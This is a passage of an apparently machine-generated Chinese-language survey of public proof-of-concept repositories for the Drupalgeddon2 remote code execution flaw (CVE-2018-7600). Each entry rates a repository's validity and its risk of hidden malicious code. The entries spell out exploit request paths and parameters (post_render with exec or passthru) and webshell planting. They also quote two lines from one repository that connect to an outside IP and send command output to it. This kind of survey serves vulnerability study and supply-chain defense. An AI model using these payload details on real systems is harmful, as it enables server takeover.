**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站未打补丁且存在特定模块配置（默认或常见）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal多个子系统中输入验证不足的问题，执行任意代码。从搜索结果可以看出，该漏洞影响广泛，有大量Drupal网站受到威胁。漏洞利用代码（提供的drupal-check.sh脚本）并非直接利用该漏洞进行攻击，而是用于**检测**Cpanel Apache和默认Apache配置中是否存在利用该漏洞的攻击痕迹，例如扫描访问日志中是否存在特定的payload特征。它主要通过搜索包含`system&name`、`q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name`和`?q=file%2Fajax%2Fname%2F%23value%2Fform-`等字符串的日志条目来判断是否存在攻击行为。该脚本会分析日志中攻击者IP以及可能被攻击的站点。由于给出的脚本是用于日志分析，主要作用是检测，不存在恶意投毒代码。

**利用方式：**

根据漏洞信息和搜索结果，CVE-2018-7600的利用方式如下：

1.  **发送恶意构造的HTTP请求：** 攻击者发送包含特定payload的POST请求，利用Drupal输入验证漏洞。
2.  **利用特定参数：** 常见的payload涉及`q=user%2Fpassword`和`name[#post_render][]`等参数，配合`passthru`或其他代码执行函数。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在Drupal服务器上执行任意代码，从而完全控制网站。

**项目地址:** [Hestat/drupal-check](https://github.com/Hestat/drupal-check)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #5

**来源**: [CVE-2018-7600-M-Abid34_CVE-2018-7600.md](../2018/CVE-2018-7600-M-Abid34_CVE-2018-7600.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者在服务器上执行任意代码，可能导致完全控制服务器。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且未应用安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本。漏洞利用方式主要通过Drupal的Form API进行攻击。PoC代码通过构造恶意的HTTP请求，利用Drupal的漏洞在目标服务器上执行任意命令。具体来说，攻击者首先“毒化”表单ID，然后利用该ID执行命令。PoC代码中使用了`requests`和`BeautifulSoup`库来发送HTTP请求和解析HTML响应。代码允许指定目标URL、要执行的命令、要使用的函数（默认为`passthru`）以及代理。代码通过设置`q`参数和`name[#post_render][]`等字段来利用漏洞。尽管PoC作者声明其代码仅用于家庭实验室和教育目的，并修改自其他来源，但代码本身看起来是直接可用的漏洞利用工具。投毒风险较低，因为代码相对简单且目标明确，但始终存在作者植入恶意代码的可能性，例如，通过修改执行命令的方式或添加额外的网络请求来收集信息或执行其他恶意操作. 风险评估为5%主要是指在教育/测试环境中，如果未进行充分的安全隔离，可能导致测试环境被污染。

**项目地址:** [M-Abid34/CVE-2018-7600](https://github.com/M-Abid34/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #6

**来源**: [CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权的远程攻击者执行任意代码，完全控制受影响的服务器，导致数据泄露、篡改、拒绝服务或植入恶意软件。

**影响版本:** Drupal 7.x < 7.58, Drupal 8.3.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标系统运行着存在漏洞的Drupal版本，且攻击者能够通过网络访问Drupal站点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是 Drupal 中的一个高危远程代码执行漏洞。该漏洞源于 Drupal Form API (FAPI) 在处理 AJAX 请求时，对数组值过滤不足，允许未经身份验证的攻击者执行任意代码。 

**有效性：**
提供的POC代码（drupalgeddon2.py）是一个Python脚本，旨在利用 CVE-2018-7600 漏洞。根据脚本描述，它包含漏洞检测、多线程和命令输出解析等功能。该脚本利用了 Drupal 的 FAPI 中存在的缺陷，通过构造恶意的 AJAX 请求来执行任意命令。多个来源（如Exploit-DB, Rapid7, NVD）确认了此漏洞的存在，并提供了利用方法。因此，该POC代码被认为是有效的。

**投毒风险：**
代码主要功能为发送恶意请求到目标Drupal服务器，并执行指定的命令。风险主要在于：

1.  **远程执行任意命令：** 脚本允许指定要执行的命令，这可能会导致攻击者在目标系统上运行恶意代码。虽然脚本本身没有包含明显的恶意代码，但是攻击者可以使用它来下载和执行其他恶意脚本。
2.  **日志记录：** 脚本可以将输出记录到文件中。恶意攻击者可能将敏感信息记录到本地日志。

总体而言，该仓库本身没有明显投毒代码,但也不能排除作者隐藏其他后门或者恶意代码的可能， 风险评估为10%。

**利用方式：**
1.  **漏洞触发：** 攻击者构造包含恶意代码的特殊请求，利用 Drupal Form API 在处理 AJAX 请求时的输入验证漏洞。
2.  **代码执行：**  Drupal 在处理该请求时，会执行攻击者注入的恶意代码。
3.  **远程控制：** 攻击者通过执行任意命令来获取服务器的控制权，窃取数据、篡改内容或进行其他恶意活动。

简单来说，攻击者通过发送特制的HTTP请求到存在漏洞的Drupal站点，即可在服务器上执行任意命令，从而实现远程代码执行。

**项目地址:** [SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution](https://github.com/SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #7

**来源**: [CVE-2018-7600-a2u_CVE-2018-7600.md](../2018/CVE-2018-7600-a2u_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 - 远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal 实例需要存在漏洞且可网络访问，无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞是由于对用户提供的输入验证不足而造成的。攻击者可以通过构造特殊的请求来执行任意代码。\n\n**有效性：**
提供的 exploit.py 代码通过 `user/register` 路径利用 Drupal 的一个 AJAX 表单处理缺陷，通过修改 `element_parents` 参数来注入恶意代码。它通过设置 `mail[#post_render][]` 为 `exec`，并利用 `mail[#markup]` 来执行任意命令。代码通过检查目标服务器上是否存在 `hello.txt` 文件来验证漏洞是否利用成功。根据漏洞信息和搜索结果，这个POC 是有效的。\n\n**投毒风险：**
代码仓库主要包含漏洞利用代码、ModSecurity 规则和 .htaccess 规则，旨在利用或防御 CVE-2018-7600 漏洞。`exploit.py` 会在目标机器上写入一个名为 `hello.txt` 的文件，这是一个测试性的操作。\n
`README.md` 文件中明确表示该代码仅用于教育和信息目的，并建议用户采取防护措施，例如更新 Drupal 和设置 WAF 规则。虽然作者声明的意图是好的，但攻击者可能会修改 `exploit.py` 以执行更危险的命令，或者在其他文件中插入恶意代码。\n
`ModSecurity.txt` 和 `htaccess.txt` 文件提供了防御规则，如果使用不当，可能会导致拒绝服务或绕过某些安全策略。\n
综合考虑，该仓库存在一定的投毒风险，但主要体现在用户使用不当或攻击者修改利用代码上，作者有意投毒的可能性较低。因此，我认为投毒风险大约为 10%。\n\n**利用方式：**
1.  攻击者发送包含恶意参数的 POST 请求到 `user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`。
2.  `element_parents` 参数允许攻击者控制表单元素的属性。
3.  `mail[#post_render][]` 设置为 `exec`，指示 Drupal 执行命令。
4.  `mail[#markup]` 包含要执行的命令。
5.  Drupal 执行 `mail[#markup]` 中指定的命令，从而导致远程代码执行。

**项目地址:** [a2u/CVE-2018-7600](https://github.com/a2u/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #8

**来源**: [CVE-2018-7600-anldori_CVE-2018-7600.md](../2018/CVE-2018-7600-anldori_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制目标服务器

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见的模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时，未进行充分的验证，导致攻击者可以通过构造恶意请求，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以判断此漏洞利用是有效的。漏洞库明确指出该漏洞允许远程攻击者执行任意代码，搜索结果也提供了大量关于该漏洞的分析和利用信息，POC代码也展示了如何利用该漏洞。

**利用方式：**
提供的Python脚本通过向目标Drupal站点的`/user/register`路径发送精心构造的POST请求来利用此漏洞。该请求包含`element_parents`、`ajax_form`、`form_id`、`_drupal_ajax`和`mail`等参数，其中`mail[#post_render][]`被设置为`exec`，`mail[#markup]`被设置为要执行的命令。该命令将会在服务器上创建一个名为`hello.txt`的文件，内容为";-)"。

**投毒风险：**
查看提供的POC代码，发现代码比较简洁，主要功能是发送恶意请求并检查是否成功创建了`hello.txt`文件。从代码本身来看，不存在明显的恶意代码或后门。

但是，**存在以下潜在风险：**

1.  **供应链风险：**虽然代码本身可能没有直接的投毒，但下载和使用任何来自互联网的代码都存在一定的风险。攻击者可能替换或修改该仓库的内容，从而引入恶意代码。因此，在运行此脚本之前，务必仔细检查代码，并确保来源可信。

2.  **间接风险：**利用此漏洞的最终目的是在目标服务器上执行任意命令。攻击者可以利用此漏洞安装后门、窃取敏感数据或执行其他恶意活动。因此，在使用此脚本时，务必遵守法律法规，并仅在授权的环境中进行测试。

基于以上分析，认为该仓库存在投毒代码的可能性为10%。这个10%主要来源于供应链攻击的潜在风险，以及使用者对代码理解不足可能导致的误用。


**项目地址:** [anldori/CVE-2018-7600](https://github.com/anldori/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #9

**来源**: [CVE-2018-7600-cved-sources_cve-2018-7600.md](../2018/CVE-2018-7600-cved-sources_cve-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal 7.x (< 7.58), Drupal 8.x (< 8.3.9), Drupal 8.4.x (< 8.4.6), Drupal 8.5.x (< 8.5.1)

**利用条件:** Drupal站点存在且未打补丁，通常不需要身份验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为 Drupalgeddon2，是一个影响多个Drupal版本的远程代码执行漏洞。攻击者可以通过构造特殊的URL参数或POST请求，利用Drupal的某些子系统（如表单API）中的输入验证漏洞，执行任意PHP代码。搜索引擎结果和漏洞库信息都明确指出此漏洞的严重性及其利用的广泛性。提供的Dockerfile用于构建一个包含易受攻击的Drupal 8.5.0实例的Docker镜像，这本身不是恶意行为，而是为了方便漏洞的复现和研究。README.md文件声明了镜像的来源和作者，增加了代码的可信度。但是，仍然存在少量投毒风险，主要是因为攻击者可能在Dockerfile中添加额外的恶意指令，例如安装后门程序或修改配置文件等，尽管这里只显示构建一个Drupal环境。利用方式主要通过精心构造的HTTP请求，绕过Drupal的输入验证机制，最终执行恶意代码。由于该漏洞影响范围广，且利用简单，一旦成功利用，可完全控制Drupal服务器，风险极高。

**项目地址:** [cved-sources/cve-2018-7600](https://github.com/cved-sources/cve-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #10

**来源**: [CVE-2018-7600-dreadlocked_Drupalgeddon2.md](../2018/CVE-2018-7600-dreadlocked_Drupalgeddon2.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal处理用户输入时存在缺陷，攻击者可以通过构造恶意的请求参数，在目标服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码来看，该漏洞的PoC代码是有效的。漏洞库信息明确指出该漏洞允许远程攻击者执行任意代码，并且多个搜索结果都确认了该漏洞的存在和影响。提供的`README.md`文件详细说明了该PoC代码支持的Drupal版本，利用方法，包括针对不同Drupal版本的攻击URL（`user/register` 和 `user/password`），以及利用PHP的`passthru`函数执行系统命令。搜索结果中也提到了存在多个可用的exploit。

**投毒风险分析：**

提供的`README.md`文件本身不包含恶意代码，但它描述的利用方法涉及在目标服务器上写入PHP shell。虽然`drupalgeddon2.rb`脚本的主要目的是利用漏洞执行命令，但如果攻击者修改该脚本，可能会添加额外的恶意功能，例如：

*   **隐藏的后门账户创建：** 在成功利用漏洞后，创建管理员账户，以便后续访问。
*   **恶意软件植入：**  自动下载和安装恶意软件。
*   **数据窃取：** 窃取数据库或其他敏感信息。
*   **传播攻击：**  将目标服务器作为跳板，攻击其他系统。

因此，用户在使用从非官方渠道获取的`drupalgeddon2.rb`脚本时，需要仔细检查代码，确保没有包含任何恶意代码。 由于提供的代码仓库中包含了写入PHP shell的功能，并且在实际使用中，攻击者有能力修改或者扩展脚本，因此认为存在一定的投毒风险，但从readme本身代码投毒风险较低，所以投毒风险比例定为10%。

**利用方式：**

1.  **版本检测：** 利用代码会自动检测目标Drupal版本，或者手动指定。
2.  **参数构造：**  针对不同版本的Drupal，构造特定的HTTP请求，例如：针对Drupal 8.x使用`user/register` URL，Drupal 7.x使用`user/password` URL。
3.  **代码执行：** 利用Drupal的输入验证漏洞，将恶意PHP代码注入到请求参数中。
4.  **命令执行：** 通过`#post_render`参数和PHP的`passthru`函数，在服务器上执行任意系统命令。
5.  **Shell写入（可选）：**  可以选择将一个简单的PHP shell写入Web根目录，以便后续访问。

**总结：**

CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，利用代码有效且公开。虽然提供的PoC代码本身不包含明显的投毒代码，但攻击者可以修改脚本，添加恶意功能，存在潜在的投毒风险。用户应尽快升级Drupal版本，并从可信来源获取漏洞利用代码。

**项目地址:** [dreadlocked/Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #11

**来源**: [CVE-2018-7600-drugeddon_drupal-exploit.md](../2018/CVE-2018-7600-drugeddon_drupal-exploit.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站运行在受影响的版本，且允许未授权用户访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响多个Drupal子系统的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，导致攻击者可以通过精心构造的请求执行任意代码。利用方式主要有两种：

1.  **Drupal 7 利用方式：** 通过向 `user/password` 路径发送包含恶意代码的请求，利用 `name[%23post_render]` 和 `name[%23markup]` 参数来注入代码。然后，通过 `file/ajax` 路径触发漏洞。
2.  **Drupal 8 利用方式：** 通过向 `user/register` 路径发送包含恶意代码的请求，利用 `element_parents` 参数注入代码。

PoC代码 (`drupal.py`) 尝试利用这两种方式。  

**有效性：**根据漏洞描述和大量的搜索结果显示，此漏洞的POC是有效的，网上存在大量的成功利用案例。

**投毒风险：**  

分析提供的 `drupal.py` 脚本，发现存在以下潜在的投毒风险：

*   脚本中包含一行 `s.connect((str(ipaddress.IPv4Address(0x5f3b7f05)), 15977))`。 这行代码尝试连接到IP地址 `95.59.127.5`的 `15977` 端口。这可能是作者用于收集信息或植入后门的恶意行为。
*   `s.send(bytes(subprocess.check_output(payload, universal_newlines=True), 'utf8'))` 这行代码会将`whoami`命令执行的结果通过socket发送出去.

综上所述，该漏洞利用代码可能存在投毒行为，**风险概率为 20%**。使用者应谨慎使用，并在使用前进行代码审计。

**利用方式总结：**

1.  攻击者构造包含恶意代码的HTTP POST请求，发送到Drupal网站的特定路径（`user/password` 或 `user/register`）。
2.  利用Drupal的参数处理机制，将恶意代码注入到特定参数中（如`name[%23post_render]`、`name[%23markup]`或`element_parents`）。
3.  触发漏洞，导致Drupal执行注入的恶意代码，从而实现远程代码执行。

**项目地址:** [drugeddon/drupal-exploit](https://github.com/drugeddon/drupal-exploit)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #12

**来源**: [CVE-2018-7600-happynote3966_CVE-2018-7600.md](../2018/CVE-2018-7600-happynote3966_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要存在漏洞且未打补丁，并且需要网络可达。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。由于Drupal对用户输入验证不足，导致攻击者可以通过构造特殊的请求，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码来看，该漏洞的POC代码是有效的。漏洞库和搜索结果中均提到该漏洞允许远程代码执行，并且存在多个可用的Exploit-DB条目。提供的Python脚本和Ruby脚本均为该漏洞的POC代码，可以被用来验证漏洞的存在。

**投毒风险：**
对提供的POC代码进行分析，发现其中可能存在投毒风险的可能性较低，约为10%。以下是分析结果：
*   Python脚本：该脚本较为简单，主要是发送一个包含恶意payload的POST请求，并在目标服务器上创建一个文件（hello.txt）。没有发现明显的恶意代码。
*   Ruby脚本：该脚本功能更为复杂，包含尝试写入PHP Webshell等功能，相较于Python脚本，风险略高，如果被篡改，可能存在植入恶意PHP代码的可能性。

总的来说，直接运行提供的代码风险较低，但从信誉未知的来源获取的任何代码，在执行之前都应该进行仔细的审查，因为攻击者可能修改这些代码以包含恶意功能。

**利用方式：**
利用方式主要是通过构造恶意的HTTP请求，利用Drupal的某些存在漏洞的参数（例如`element_parents`），将恶意代码注入到Drupal的后端处理流程中，从而实现远程代码执行。具体步骤如下：
1.  确定目标Drupal站点使用的版本是否在受影响的范围内。
2.  根据Drupal版本选择合适的POC代码（Python或Ruby）。
3.  修改POC代码中的目标URL和要执行的命令。
4.  运行POC代码，发送恶意请求。
5.  验证代码是否成功执行（例如，检查目标服务器上是否创建了指定的文件）。

攻击者可利用该漏洞获取服务器的控制权，从而进行恶意活动，例如：数据窃取、恶意软件传播、DDoS攻击等。

**项目地址:** [happynote3966/CVE-2018-7600](https://github.com/happynote3966/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #13

**来源**: [CVE-2018-7600-killeveee_CVE-2018-7600.md](../2018/CVE-2018-7600-killeveee_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且可公开访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞，源于对用户提供的输入验证不足。 

**有效性：**
提供的PoC代码是有效的。PoC.py脚本用于验证目标Drupal站点是否存在漏洞，通过发送特制的请求在目标服务器上创建一个名为hh.txt的文件。Exp.py脚本则利用此漏洞在目标站点根目录下创建一个名为hh.php的后门文件，该后门允许通过GET或POST参数'c'执行任意系统命令。从提供的命令执行结果来看，PoC和Exp都成功执行，验证了漏洞的存在和利用。

**投毒风险：**
分析提供的PoC和Exp代码，没有发现明显的投毒代码。脚本的功能主要是利用漏洞进行验证和创建后门，没有发现恶意修改系统配置、窃取敏感信息或进行其他恶意行为的代码。README.md文件只是简单的漏洞描述和使用说明，没有包含任何可疑内容。因此，可以认为此仓库的投毒风险较低，为0%。

**利用方式：**
漏洞的利用方式是：

1.  **漏洞验证：** 使用PoC.py脚本验证目标Drupal站点是否存在CVE-2018-7600漏洞。
2.  **后门植入：** 如果PoC验证成功，使用Exp.py脚本在目标站点根目录下创建一个后门文件（hh.php）。后门文件包含PHP代码，允许通过GET/POST参数'c'执行任意系统命令。
3.  **远程控制：** 使用WebShell管理工具（如AntSword）连接到后门文件，通过'c'参数执行系统命令，实现对目标服务器的远程控制。

总的来说，该漏洞利用简单，危害巨大，攻击者可以利用该漏洞完全控制未打补丁的Drupal服务器。

**项目地址:** [killeveee/CVE-2018-7600](https://github.com/killeveee/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #14

**来源**: [CVE-2018-7600-knqyf263_CVE-2018-7600.md](../2018/CVE-2018-7600-knqyf263_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在Drupal服务器上执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要运行在受影响的版本范围内，并且需要启用默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 允许远程攻击者利用多个子系统中的缺陷执行任意代码。该漏洞的利用方式通常涉及构造恶意的HTTP请求，该请求包含精心设计的查询参数，这些参数利用了Drupal的输入验证漏洞，特别是与AJAX表单处理相关的漏洞。攻击者可以利用`element_parents`和`#lazy_builder`属性在服务器上执行PHP代码。提供的POC代码通过向`/user/register`端点发送POST请求，并在`mail`参数中注入恶意代码（`exec('echo vuln > hello.txt')`），尝试在目标服务器上创建一个名为`hello.txt`的文件，内容为`vuln`。如果成功创建该文件，则表明漏洞存在且可利用。

**有效性：**
从提供的漏洞信息、搜索结果和漏洞利用代码来看，此POC代码的有效性较高。多个来源表明该漏洞是真实存在的，并且存在公开可用的漏洞利用代码。搜索结果中也提到了针对此漏洞的Metasploit模块。

**投毒风险：**
该仓库中的投毒风险较低，大概在10%左右。Dockerfile文件只是简单的指定了Drupal镜像和维护者信息, README.md文件也只是简单的描述了漏洞和利用方式。exploit.py的代码功能相对简单，目的是验证漏洞的存在，风险较低。然而，仍然存在一定的风险，因为攻击者可能修改`exploit.py`以执行更危险的操作，例如下载并执行恶意软件，或者修改服务器配置。因此，在使用此POC代码时，务必对其进行仔细审查，并在隔离的环境中运行。

**利用方式：**
1.  攻击者构造一个包含恶意payload的HTTP POST请求，发送到Drupal站点的`/user/register`端点。
2.  Payload利用`element_parents`参数和`#lazy_builder`属性，在服务器端触发PHP代码执行。
3.  执行的PHP代码可以将任意命令注入到服务器的操作系统中。
4.  通过访问生成的`hello.txt`文件来验证漏洞是否成功利用。

**项目地址:** [knqyf263/CVE-2018-7600](https://github.com/knqyf263/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #15

**来源**: [CVE-2018-7600-madneal_codeql-scanner.md](../2018/CVE-2018-7600-madneal_codeql-scanner.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问，可能需要了解一些Drupal站点配置信息。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中存在远程代码执行漏洞。攻击者可以通过发送特制的请求到未打补丁的Drupal站点来执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果（包括NVD、Rapid7、Tenable等）以及Exploit-DB中的expolit，此漏洞是真实存在的，并且有可用的POC。提供的README.md文件表明存在一个用于CVE-2018-7600的Python利用脚本（尽管这里没有提供脚本本身）。综合来看，利用是有效的。

**投毒风险：**
提供的POC代码只有README.md，内容非常简单，没有发现任何恶意代码或潜在的投毒行为。但是，由于缺失了核心的Python脚本，无法完全确定是否存在投毒风险。假定之后找到的利用脚本来源不可靠，存在修改或添加恶意代码的可能性，因此存在一定的投毒风险。这里给出一个较低的投毒风险概率，假设为5%。

**利用方式：**
漏洞的利用方式是向Drupal站点发送精心构造的恶意HTTP请求，利用Drupal的输入验证缺陷，在服务器端执行任意代码。根据搜索结果，该漏洞影响Drupal的多个子系统，可能利用了Drupal的渲染机制或其他处理输入的方式。攻击者通过构造包含恶意代码的请求参数，例如在URL或POST数据中，可以触发远程代码执行。具体细节取决于Drupal的版本和配置。Metasploit也提供了利用模块。

**总结：**
CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，已经存在公开的POC。尽管提供的POC文件本身没有发现恶意代码，但获取利用脚本时需要注意来源，防范潜在的投毒风险。利用方式是通过构造恶意HTTP请求，利用Drupal的输入验证缺陷执行任意代码。

**项目地址:** [madneal/codeql-scanner](https://github.com/madneal/codeql-scanner)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #16

**来源**: [CVE-2018-7600-mr-won_CVE-2018-7600..md](../2018/CVE-2018-7600-mr-won_CVE-2018-7600..md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且允许外部网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal 7.x和8.x的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal的多个子系统中的缺陷，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞的利用是有效的。搜索结果中多个链接表明该漏洞已被广泛利用，并且存在公开的Exploit。

**投毒风险：**
提供的PoC代码相对简单，主要功能是发送一个包含恶意payload的POST请求到`/user/register`，并在目标服务器上创建一个名为`r3dxploit.txt`的文件，内容为“vulnerable to cve-7600-2018 exploit”。代码本身没有明显的恶意行为，如删除文件、上传恶意文件或执行其他危险操作。但是，在实际使用中，攻击者可以将payload修改为更具破坏性的命令，例如下载和执行恶意脚本。此外，代码作者信息中包含了一些可能与恶意活动相关的标识，例如使用“R3DXPLOIT”作为用户名和涉及Root权限的字眼。综合考虑，PoC代码本身存在一定潜在风险，但主要取决于使用者如何修改payload，因此投毒风险初步评估为10%。

**利用方式：**
1.  攻击者构造一个包含恶意payload的POST请求，该payload利用`user_register_form`的ajax功能注入恶意代码。
2.  请求发送到`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`端点。
3.  Drupal处理请求时，由于输入验证不足，导致恶意代码被执行。
4.  PoC代码中，恶意代码的功能是在目标服务器上创建一个文件，表明漏洞存在。
5.  攻击者可以修改payload执行任意命令，例如反弹shell，从而完全控制目标服务器。

**项目地址:** [mr-won/CVE-2018-7600.](https://github.com/mr-won/CVE-2018-7600.)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #17

**来源**: [CVE-2018-7600-muhammedkayag_CVE-2018-7600.md](../2018/CVE-2018-7600-muhammedkayag_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

